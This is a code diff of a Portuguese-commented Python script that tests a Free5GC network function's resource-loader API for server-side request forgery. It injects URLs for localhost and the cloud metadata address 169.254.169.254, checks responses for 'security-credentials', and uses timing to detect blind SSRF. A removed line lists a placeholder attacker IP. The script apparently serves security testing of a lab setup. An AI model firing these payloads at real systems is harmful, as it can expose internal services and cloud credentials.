@@ -3,38 +3,47 @@ import urllib3
 import json
 import time
 
+#--- Configurações de Ambiente (Valores Padrão do Free5GC) ---
+NF_CONFIG = {
+    "NEF_IP": "127.0.0.1",
+    "NEF_PORT": 29509
+}
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-NF_API_URL = "https://127.0.0.1:8000/api/resource_loader"
-TARGET_PARAMETER = "url"
+def test_ssrf():
+    print("=" * 50)
+    print("A9: Testando Server-Side Request Forgery (SSRF)")
+    print("=" * 50)
 
-test_endpoints = [
-    "http://127.0.0.1:80",
-    "http://169.254.169.254/latest/meta-data",
-    "http://[IP_INTERNO_DA_NF]:[PORTA_DO_SERVICO]",
-    "http://[SEU_IP_DE_ATAQUE]:8080"
-]
+    nf_api_url = f"https://{NF_CONFIG['NEF_IP']}:{NF_CONFIG['NEF_PORT']}/api/resource_loader" # Endpoint de exemplo
+    target_param = "url"
 
-print("[+] Testando Sever-Side Request Forgery (SSRF)...")
-
-for url in test_endpoints:
-    payload = {TARGET_PARAMETER: url}
-    print(f"[*] Tentando injetar URL: {url}")
-    try:
-        start_time = time.time()
-        response = requests.post(NF_API_URL, headers={"Content-Type": "application/json"}, data=json.dumps(payload), timeout=5, verify=False)
-        end_time = time.time()
-
-        if response.status_code == 200 and "security-credentials" in response.text:
-            print("[!!!] VULNERABILIDADE SSRF DETECTADA! Acesso a metadados de nuvem.")
-            print(f"      Conteúdo do recurso: {response.text}")
-            break
-        if response.status_code == 200 or response.status_code == 302:
-            print(f"[!] Possível SSRF detectada! Status {response.status_code} na URL '{url}'.")
+    test_endpoints = [
+        "http://127.0.0.1:80",
+        "http://169.254.169.254/latest/meta-data"
+    ]
+    
+    vulnerable_found = False
+    for url in test_endpoints:
+        try:
+            start_time = time.time()
+            response = requests.post(nf_api_url, json={target_param: url}, verify=False, timeout=5)
+            end_time = time.time()
             
-        response_time = end_time - start_time
-        if response_time > 3:
-            print(f"[!] Possível SSRF Blind detectada! Requisição para '{url}' demorou {response_time:.2f} segundos.")
+            if response.status_code == 200 and "security-credentials" in response.text:
+                print("[!!!] VULNERABILIDADE SSRF DETECTADA! Acesso a metadados de nuvem.")
+                vulnerable_found = True
+                break
+            
+            response_time = end_time - start_time
+            if response_time > 3:
+                print(f"[!] Possível SSRF Blind detectada! Requisição para '{url}' demorou {response_time:.2f}s.")
 
-    except requests.exceptions.RequestException as e:
-        print(f"[-] Erro ao injetar URL '{url}': {e}")
+        except requests.exceptions.RequestException as e:
+            pass
+    
+    if not vulnerable_found:
+        print("[+] SSRF não detectado com payloads de teste.")
+
+if __name__ == "__main__":
+    test_ssrf()
